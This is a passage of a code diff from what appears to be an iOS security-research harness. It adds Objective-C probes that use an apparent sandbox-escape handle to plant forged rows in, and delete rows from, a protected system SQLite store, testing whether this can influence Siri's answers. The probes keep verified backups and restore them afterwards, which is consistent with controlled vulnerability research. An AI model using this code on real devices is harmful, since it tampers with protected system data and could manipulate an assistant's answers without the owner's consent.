+    LOG("[bq31] CONTROL rows: feedEntries=%d feedMetadata=%d realBootId=%s",
+        ent0, meta0, realBoot ? realBoot.UTF8String : "(none!)");
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0 || !realBoot) {
+        LOG("[bq31] CONTROL incomplete — no blind INSERT");
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq31-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+    }
+    LOG("[bq31] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq31] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq31] WRITE open failed (%s)", wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    if (entCols.count == 0) {
+        LOG("[bq31] schema unreadable — aborting");
+        sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq31] done"); return;
+    }
+    NSString *(^valFor)(NSString *, NSString *, NSString *) =
+        ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+        if ([col isEqualToString:@"feedId"])    return feed;
+        if ([col isEqualToString:@"bootId"])    return boot;
+        if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+            return @"FZ29Oracle/fz29";
+        if ([col isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+        if ([col isEqualToString:@"metadata"])  return nil;
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    for (NSString *c in entCols)
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+    NSString *(^insSQL)(NSString *, NSString *) =
+        ^NSString *(NSString *feed, NSString *boot) {
+        NSMutableString *vals = [NSMutableString string];
+        for (NSString *c in entCols) {
+            NSString *v = valFor(c, feed, boot);
+            [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+        }
+        return [NSString stringWithFormat:
+            @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    };
+    char *err = NULL;
+    int changed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
+    int rc1 = sqlite3_exec(wdb,
+        insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE").UTF8String,
+        NULL, NULL, &err);
+    int rc2 = rc1 == SQLITE_OK
+        ? sqlite3_exec(wdb,
+            insSQL(@"fz29.bootok", realBoot).UTF8String, NULL, NULL, &err)
+        : rc1;
+    if (rc2 == SQLITE_OK) changed = 1;
+    else LOG("[bq31] WRITE rc=%d: %s", rc2, err ?: "?");
+    if (err) { sqlite3_free(err); err = NULL; }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq31] WRITE rolled back");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq31] WRITE committed: oracle+control in place");
+    }
+    fsync(fileno(stderr));
+
+    // ---- media dance: rich nowPlayingInfo + play/pause/resume
+    __block AVAudioPlayer *player = nil;
+    if (changed) {
+        {   // inline on the probe thread — bq23 proved AVAudioPlayer
+            // works off-main here; dispatch_sync to main risks a stall.
+            @autoreleasepool {
+                NSError *ce = nil, *ae = nil;
+                [[AVAudioSession sharedInstance]
+                    setCategory:AVAudioSessionCategoryPlayback error:&ce];
+                [[AVAudioSession sharedInstance] setActive:YES error:&ae];
+                const int sr = 44100, nsamp = sr;
+                NSMutableData *wav = [NSMutableData dataWithLength:
+                    44 + nsamp * 2];
+                uint8_t *w = (uint8_t *)[wav mutableBytes];
+                *(uint32_t *)(w + 0)  = 0x46464952;
+                *(uint32_t *)(w + 4)  = 36 + nsamp * 2;
+                *(uint32_t *)(w + 8)  = 0x45564157;
+                *(uint32_t *)(w + 12) = 0x20746d66;
+                *(uint32_t *)(w + 16) = 16;
+                *(uint16_t *)(w + 20) = 1;
+                *(uint16_t *)(w + 22) = 1;
+                *(uint32_t *)(w + 24) = sr;
+                *(uint32_t *)(w + 28) = sr * 2;
+                *(uint16_t *)(w + 32) = 2;
+                *(uint16_t *)(w + 34) = 16;
+                *(uint32_t *)(w + 36) = 0x61746164;
+                *(uint32_t *)(w + 40) = nsamp * 2;
+                int16_t *pcm = (int16_t *)(w + 44);
+                for (int i = 0; i < nsamp; i++) {
+                    double t = (double)i / sr;
+                    pcm[i] = (int16_t)(0.2 * sin(2 * 3.14159265358979323846
+                                                  * 440.0 * t) * 32767.0);
+                }
+                player = [[AVAudioPlayer alloc] initWithData:wav error:&ae];
+                player.numberOfLoops = -1;
+                // Rich metadata — this is what an app normally sets and
+                // what mediaremoted publishes as nowPlaying feeds.
+                [MPNowPlayingInfoCenter defaultCenter].nowPlayingInfo = @{
+                    MPMediaItemPropertyTitle: @"FZ29 Feed Probe",
+                    MPMediaItemPropertyArtist: @"fz29 artist",
+                    MPMediaItemPropertyAlbumTitle: @"fz29 album",
+                    MPMediaItemPropertyPlaybackDuration: @(3600.0),
+                    MPMediaItemPropertyMediaType:
+                        @(MPMediaTypeMusic),
+                };
+                BOOL playing = [player play];
+                LOG("[bq31] media: catErr=%s actErr=%s play=%d nowInfo=set "
+                    "thread=%s", ce ? "yes" : "no",
+                    ae ? [[ae localizedDescription] UTF8String] : "no",
+                    playing ? 1 : 0,
+                    [NSThread isMainThread] ? "main" : "bg");
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- watch with state transitions at t=25 (pause) and t=45 (resume)
+    int fileChanges = 0, oracleGone = -1, ctrlGone = -1;
+    struct stat pDb = {0}, pWal = {0}, pShm = {0};
+    stat(dbp.fileSystemRepresentation, &pDb);
+    stat(walp.fileSystemRepresentation, &pWal);
+    stat(shmPath.fileSystemRepresentation, &pShm);
+    if (changed) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = YES;
+        });
+        for (int t = 0; t < secs; t++) {
+            if (t == 25 && player) {
+                [player pause];
+                LOG("[bq31] t=%ds PAUSE transition", t);
+                fsync(fileno(stderr));
+            }
+            if (t == 45 && player) {
+                [player play];
+                LOG("[bq31] t=%ds RESUME transition", t);
+                fsync(fileno(stderr));
+            }
+            if (t == 70 && player) {
+                [player stop];
+                [MPNowPlayingInfoCenter defaultCenter].nowPlayingInfo = nil;
+                LOG("[bq31] t=%ds STOP + clear nowPlaying", t);
+                fsync(fileno(stderr));
+            }
+            usleep(1000 * 1000);
+            struct stat cdb = {0}, cwal = {0}, cshm = {0};
+            BOOL any = NO;
+            if (stat(dbp.fileSystemRepresentation, &cdb) == 0 &&
+                (cdb.st_mtime != pDb.st_mtime || cdb.st_size != pDb.st_size)) {
+                LOG("[bq31] t=%ds DB changed: %lld/%lld -> %lld/%lld%s", t,
+                    (long long)pDb.st_mtime, (long long)pDb.st_size,
+                    (long long)cdb.st_mtime, (long long)cdb.st_size,
+                    t < 71 ? "" : " [after stop]");
+                pDb = cdb; any = YES;
+            }
+            if (stat(walp.fileSystemRepresentation, &cwal) == 0 &&
+                (cwal.st_mtime != pWal.st_mtime || cwal.st_size != pWal.st_size)) {
+                LOG("[bq31] t=%ds WAL changed: %lld/%lld -> %lld/%lld%s", t,
+                    (long long)pWal.st_mtime, (long long)pWal.st_size,
+                    (long long)cwal.st_mtime, (long long)cwal.st_size,
+                    t < 71 ? "" : " [after stop]");
+                pWal = cwal; any = YES;
+            }
+            if (stat(shmPath.fileSystemRepresentation, &cshm) == 0 &&
+                (cshm.st_mtime != pShm.st_mtime || cshm.st_size != pShm.st_size)) {
+                LOG("[bq31] t=%ds SHM changed: %lld/%lld -> %lld/%lld", t,
+                    (long long)pShm.st_mtime, (long long)cshm.st_mtime,
+                    (long long)pShm.st_size, (long long)cshm.st_size);
+                pShm = cshm; any = YES;
+            }
+            if (any) fileChanges++;
+            int o = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.noboot'");
+            int c = bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                                    "WHERE feedId='fz29.bootok'");
+            if (o == 0 && oracleGone < 0) {
+                oracleGone = t;
+                LOG("[bq31] t=%ds ORACLE ROW DELETED — cleanup ran!", t);
+            }
+            if (c == 0 && ctrlGone < 0) {
+                ctrlGone = t;
+                LOG("[bq31] t=%ds CONTROL ROW GONE — table reset!", t);
+            }
+            if (any || o == 0 || c == 0) fsync(fileno(stderr));
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [UIApplication sharedApplication].idleTimerDisabled = NO;
+            player = nil;
+            [MPNowPlayingInfoCenter defaultCenter].nowPlayingInfo = nil;
+            [[AVAudioSession sharedInstance] setActive:NO error:NULL];
+        });
+    }
+
+    // ---- rollback
+    int quiet = 0;
+    for (int i = 0; i < 10 && quiet < 3; i++) {
+        struct stat a = {0}, b2 = {0};
+        stat(dbp.fileSystemRepresentation, &a);
+        usleep(1000 * 1000);
+        stat(dbp.fileSystemRepresentation, &b2);
+        quiet = (a.st_mtime == b2.st_mtime && a.st_size == b2.st_size)
+            ? quiet + 1 : 0;
+    }
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId IN "
+                     "('fz29.noboot','fz29.bootok')", NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak) && !bq18_copy(bak, f)) bytesBack = NO;
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq31] VERIFY rows back: %d/%d %d/%d bytes-identical=%d",
+        ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (oracleGone >= 0 && ctrlGone < 0)
+        verdict = "POSITIVE: producer write observed AND cleanup ran";
+    else if (fileChanges > 0)
+        verdict = "POSITIVE-CHANNEL: producer wrote the store on demand "
+                  "(cleanup not run)";
+    else if (ctrlGone >= 0)
+        verdict = "TABLE RESET — interpret manually";
+    else
+        verdict = "NEGATIVE: nowPlaying dance produced no store write";
+    LOG("[bq31] VERDICT: %s (changes=%d oracleGone=%d ctrlGone=%d)",
+        verdict, fileChanges, oracleGone, ctrlGone);
+
+    bad_query_release(h);
+    LOG("[bq31] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq32): the reboot experiment (operator-approved, §175/§184).
+//
+// Why reboot is the deterministic trigger: the live rows prove the
+// store is written in the FIRST SECONDS after boot (media
+// .groupingInfo at boot+30 s, maps.parkedCar at boot+1.5 min — bq10
+// lastUpdate vs kern.boottime), i.e. the service OPENS the store at
+// boot, and the bootId-keyed cleanup ("...RE bootId=?" next to the
+// row SQL in svc) can only have effect when the boot actually
+// CHANGED — which every same-boot window (bq23/27/28/30/31) could
+// not produce. Same-boot observation was structurally blind to it.
+//
+//   plant  (FUZZ_BQ32_MODE=plant, default): controls + verified
+//          byte-backup + insert oracle (foreign bootId) + control
+//          (REAL plant-time bootId). NO rollback — rows must
+//          survive the reboot. Backup persists in Documents.
+//   verify (FUZZ_BQ32_MODE=verify): re-read the store after boot,
+//          report row presence + current bootId + file mtimes vs
+//          boot, then restore the pre-plant backup byte-exact (this
+//          also reverts boot-time producer writes — content-only,
+//          producers rewrite on their next event, §175) and verify.
+//
+// Interpretation table (both rows carry stale-or-fake bootIds after
+// a reboot, so BOTH disappearing is the expected cleanup result):
+//   oracle gone + control gone -> cleanup ran at boot: POSITIVE
+//   both present               -> no cleanup at boot: NEGATIVE
+//   oracle gone + control here -> cleanup is not bootId-keyed
+//                                 (interpret manually)
+// Controls (§144): escape handle; counts before plant AND after
+// verify; byte-identical restore; mode spelled in every log line.
+// ---------------------------------------------------------------------------
+
+static void p_bq32(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    const char *mode = getenv("FUZZ_BQ32_MODE") ?: "plant";
+    BOOL verify = (strcmp(mode, "verify") == 0);
+    LOG("[bq32] v177 reboot experiment, MODE=%s", mode);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq32] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq32] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq32-backup"];
+
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq32] CONTROL db stat errno %d — target gone", errno);
+        bad_query_release(h); LOG("[bq32] done"); return;
+    }
+
+    // boot context for both modes: how old are the files vs boot?
+    struct timeval boot = {0};
+    size_t bl = sizeof(boot);
+    int brc = sysctlbyname("kern.boottime", &boot, &bl, NULL, 0);
+    struct stat sdb = {0}, swal = {0};
+    stat(dbp.fileSystemRepresentation, &sdb);
+    stat(walp.fileSystemRepresentation, &swal);
+    LOG("[bq32] CONTEXT db mtime %lld (+%llds after boot) size %lld; "
+        "wal mtime %lld size %lld; boot rc %d; now %lld",
+        (long long)sdb.st_mtime,
+        brc == 0 ? (long long)(sdb.st_mtime - boot.tv_sec) : -1,
+        (long long)sdb.st_size, (long long)swal.st_mtime,
+        (long long)swal.st_size, brc, (long long)time(NULL));
+    fsync(fileno(stderr));
+
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq32] CONTROL readonly open failed — aborting");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq32] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    int nO = bq18_count(db, "SELECT count(*) FROM feedEntries "
+                             "WHERE feedId='fz29.noboot'");
+    int nC = bq18_count(db, "SELECT count(*) FROM feedEntries "
+                             "WHERE feedId='fz29.bootok'");
+    NSString *realBoot = nil;
+    sqlite3_stmt *q = NULL;
+    if (sqlite3_prepare_v2(db,
+            "SELECT bootId FROM feedEntries "
+            "WHERE bootId NOT LIKE 'FZ29%' LIMIT 1", -1, &q, NULL)
+            == SQLITE_OK && sqlite3_step(q) == SQLITE_ROW) {
+        const char *b = (const char *)sqlite3_column_text(q, 0);
+        if (b) realBoot = [NSString stringWithUTF8String:b];
+    }
+    if (q) sqlite3_finalize(q);
+    LOG("[bq32] STATE rows=%d meta=%d oracle=%d control=%d realBootId=%s",
+        ent0, meta0, nO, nC, realBoot ? realBoot.UTF8String : "(none)");
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+
+    if (!verify) {
+        // ---------------- PLANT ----------------
+        if (ent0 < 0 || meta0 < 0 || !realBoot) {
+            LOG("[bq32] CONTROL incomplete — no blind INSERT");
+            bad_query_release(h); LOG("[bq32] done"); return;
+        }
+        if (nO > 0 || nC > 0) {
+            LOG("[bq32] markers ALREADY in place (oracle=%d control=%d) — "
+                "plant is idempotent, skipping INSERT", nO, nC);
+            bad_query_release(h); LOG("[bq32] done"); return;
+        }
+        [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+        [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+            withIntermediateDirectories:YES attributes:nil error:NULL];
+        BOOL backupOK = YES;
+        for (NSString *f in files) {
+            struct stat fs2;
+            if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+            NSString *dst = [bdir stringByAppendingPathComponent:
+                f.lastPathComponent];
+            if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+        }
+        LOG("[bq32] BACKUP %s", backupOK ? "verified" : "BROKEN");
+        fsync(fileno(stderr));
+        if (!backupOK) {
+            LOG("[bq32] no verified backup — refusing to write");
+            bad_query_release(h); LOG("[bq32] done"); return;
+        }
+        sqlite3 *wdb = NULL;
+        if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                            NULL) != SQLITE_OK) {
+            LOG("[bq32] WRITE open failed (%s)",
+                wdb ? sqlite3_errmsg(wdb) : "?");
+            if (wdb) sqlite3_close(wdb);
+            bad_query_release(h); LOG("[bq32] done"); return;
+        }
+        NSMutableArray *entCols = [NSMutableArray array];
+        sqlite3_stmt *ti = NULL;
+        if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1,
+                               &ti, NULL) == SQLITE_OK)
+            while (sqlite3_step(ti) == SQLITE_ROW)
+                [entCols addObject:[NSString stringWithUTF8String:
+                    (const char *)sqlite3_column_text(ti, 1)]];
+        if (ti) sqlite3_finalize(ti);
+        if (entCols.count == 0) {
+            LOG("[bq32] schema unreadable — aborting");
+            sqlite3_close(wdb);
+            bad_query_release(h); LOG("[bq32] done"); return;
+        }
+        NSString *(^valFor)(NSString *, NSString *, NSString *) =
+            ^NSString *(NSString *col, NSString *feed, NSString *boot) {
+            if ([col isEqualToString:@"feedId"])    return feed;
+            if ([col isEqualToString:@"bootId"])    return boot;
+            if ([col isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+            if ([col hasPrefix:@"entity"] || [col hasPrefix:@"Entity"])
+                return @"FZ29Oracle/fz29";
+            if ([col isEqualToString:@"lastUpdate"])
+                return @"2099-01-01T00:00:00.000";
+            if ([col isEqualToString:@"lnValue"])   return @"fz29-oracle";
+            if ([col isEqualToString:@"metadata"])  return nil;
+            return @"fz29";
+        };
+        NSMutableString *cols = [NSMutableString string];
+        for (NSString *c in entCols)
+            [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+        NSString *(^insSQL)(NSString *, NSString *) =
+            ^NSString *(NSString *feed, NSString *boot) {
+            NSMutableString *vals = [NSMutableString string];
+            for (NSString *c in entCols) {
+                NSString *v = valFor(c, feed, boot);
+                [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+                    v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+            }
+            return [NSString stringWithFormat:
+                @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+        };
+        char *err = NULL;
+        int changed = 0;
+        sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, NULL);
+        int rc1 = sqlite3_exec(wdb,
+            insSQL(@"fz29.noboot", @"FZ29-NOBOOT-ORACLE").UTF8String,
+            NULL, NULL, &err);
+        int rc2 = rc1 == SQLITE_OK
+            ? sqlite3_exec(wdb,
+                insSQL(@"fz29.bootok", realBoot).UTF8String, NULL, NULL, &err)
+            : rc1;
+        if (rc2 == SQLITE_OK) changed = 1;
+        else LOG("[bq32] WRITE rc=%d: %s", rc2, err ?: "?");
+        if (err) { sqlite3_free(err); err = NULL; }
+        if (!changed) {
+            sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+            LOG("[bq32] WRITE rolled back — plant FAILED");
+        } else {
+            sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+            LOG("[bq32] PLANTED oracle+control (realBoot=%s) — REBOOT NOW, "
+                "then run MODE=verify",
+                realBoot.UTF8String);
+        }
+        fsync(fileno(stderr));
+        sqlite3_close(wdb);
+        bad_query_release(h);
+        LOG("[bq32] done");
+        return;
+    }
+
+    // ---------------- VERIFY (after reboot) ----------------
+    if (nO < 0 || nC < 0) {
+        LOG("[bq32] VERIFY read broken (oracle=%d control=%d) — no verdict",
+            nO, nC);
+        bad_query_release(h); LOG("[bq32] done"); return;
+    }
+    LOG("[bq32] VERIFY presence: oracle=%d control=%d (plant-time both were "
+        "1/1); current realBootId=%s", nO, nC,
+        realBoot ? realBoot.UTF8String : "(none — store still empty)");
+
+    BOOL backupExists = [[NSFileManager defaultManager]
+        fileExistsAtPath:[bdir stringByAppendingPathComponent:@"db"]];
+    if (!backupExists) {
+        LOG("[bq32] VERIFY: no backup in %s — CANNOT restore, markers left "
+            "in place", bdir.UTF8String);
+        bad_query_release(h); LOG("[bq32] done"); return;
+    }
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        struct stat fs2;
+        if (stat(bak.fileSystemRepresentation, &fs2) != 0) continue; // absent backup
+        if (!bq18_same(f, bak)) {
+            if (!bq18_copy(bak, f)) {
+                bytesBack = NO;
+                LOG("[bq32] RESTORE FAIL %s", f.lastPathComponent.UTF8String);
+            }
+        }
+    }
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack &&
+        bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq32] VERIFY rows back: %d/%d %d/%d bytes-identical=%d",
+        ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+
+    const char *verdict;
+    if (nO == 0 && nC == 0)
+        verdict = "POSITIVE: both stale/fake rows deleted — boot-time "
+                  "cleanup ran (bootId-keyed semantics confirmed)";
+    else if (nO == 0 && nC > 0)
+        verdict = "SPLIT: oracle gone, control alive — cleanup keyed by "
+                  "something other than bootId; interpret manually";
+    else if (nO > 0 && nC > 0)
+        verdict = "NEGATIVE: both markers survived the reboot — no "
+                  "cleanup at boot";
+    else
+        verdict = "WEIRD: control gone, oracle alive — investigate";
+    LOG("[bq32] VERDICT: %s", verdict);
+
+    bad_query_release(h);
+    LOG("[bq32] done");
+}
+
+// ---------------------------------------------------------------------------
+// V177 (p_bq34): store-vs-mobiletimerd discrimination for Siri's timer
+// answers (the baseline of the INPUT test).
+//
+// Baseline (no phase): timer running + store row present -> Siri says
+// "one timer" and names its time (user-observed). The row's lnValue
+// carries ONLY the LNEntityIdentifier (714-byte archive captured by
+// bq27), no duration — so WHERE the enumeration comes from (store row
+// or mobiletimerd) decides whether a planted/forged clock.timers row
+// can influence Siri at all.
+//
+//   erase   (FUZZ_BQ34_MODE=erase, default): controls + verified
+//           byte-backup to Documents/bq34-backup + DELETE of
+//           feedId='clock.timers' rows ONLY (mobiletimerd untouched,
+//           the running timer keeps going), NO rollback — the store
+//           must stay rowless while the user asks Siri again.
+//           Interpretation: Siri "no timers" with a visibly running
+//           timer -> Siri enumerates the STORE (INPUT observable
+//           confirmed); Siri still "one timer" -> enumeration comes
+//           from mobiletimerd directly (row planting invisible to
+//           Siri; fall back to exportedContent/displayRepresentation
+//           or the client XPC feed).
+//   restore (FUZZ_BQ34_MODE=restore): byte-exact backup return +
+//           byte-identical check + row counts.
+// Controls (§144): escape handle, counts before/after, verified
+// backup, bytes-identical restore, mode spelled in every line.
+// ---------------------------------------------------------------------------
+
+static void p_bq34(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    const char *mode = getenv("FUZZ_BQ34_MODE") ?: "erase";
+    BOOL restore = (strcmp(mode, "restore") == 0);
+    LOG("[bq34] v177 timer-row eraser, MODE=%s", mode);
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq34] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq34] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSArray *files = @[ dbp,
+        [dbp stringByAppendingString:@"-wal"],
+        [dbp stringByAppendingString:@"-shm"] ];
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq34-backup"];
+
+    sqlite3 *db = NULL;
+    int ow = restore ? SQLITE_OPEN_READONLY : SQLITE_OPEN_READWRITE;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, ow, NULL) != SQLITE_OK) {
+        LOG("[bq34] CONTROL open failed (%s) — aborting",
+            db ? sqlite3_errmsg(db) : "?");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq34] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int t0 = bq18_count(db, "SELECT count(*) FROM feedEntries "
+                            "WHERE feedId='clock.timers'");
+    LOG("[bq34] STATE rows=%d clock.timers=%d", ent0, t0);
+    fsync(fileno(stderr));
+
+    if (!restore) {
+        if (t0 <= 0) {
+            LOG("[bq34] CONTROL: no clock.timers row to erase — refusing "
+                "pointless write (was the timer started?)");
+            sqlite3_close(db);
+            bad_query_release(h); LOG("[bq34] done"); return;
+        }
+        [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+        [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+            withIntermediateDirectories:YES attributes:nil error:NULL];
+        BOOL backupOK = YES;
+        for (NSString *f in files) {
+            struct stat fs2;
+            if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+            NSString *dst = [bdir stringByAppendingPathComponent:
+                f.lastPathComponent];
+            if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+        }
+        LOG("[bq34] BACKUP %s", backupOK ? "verified" : "BROKEN");
+        fsync(fileno(stderr));
+        if (!backupOK) {
+            LOG("[bq34] no verified backup — refusing to erase");
+            sqlite3_close(db);
+            bad_query_release(h); LOG("[bq34] done"); return;
+        }
+        char *err = NULL;
+        int rc = sqlite3_exec(db, "DELETE FROM feedEntries "
+                              "WHERE feedId='clock.timers'", NULL, NULL, &err);
+        int t1 = bq18_count(db, "SELECT count(*) FROM feedEntries "
+                                "WHERE feedId='clock.timers'");
+        int ent1 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+        LOG("[bq34] ERASE rc=%d%s rows %d->%d clock.timers %d->%d — "
+            "ASK SIRI NOW (timer still runs in mobiletimerd)",
+            rc, err ? ": %s" : "", ent0, ent1, t0, t1);
+        if (err) { LOG("[bq34] err %s", err); sqlite3_free(err); }
+        fsync(fileno(stderr));
+        sqlite3_close(db);
+        bad_query_release(h);
+        LOG("[bq34] done");
+        return;
+    }
+
+    // ---- restore: byte-exact backup return
+    sqlite3_close(db);
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        struct stat fs2;
+        if (stat(bak.fileSystemRepresentation, &fs2) != 0) continue;
+        if (!bq18_same(f, bak) && !bq18_copy(bak, f)) {
+            bytesBack = NO;
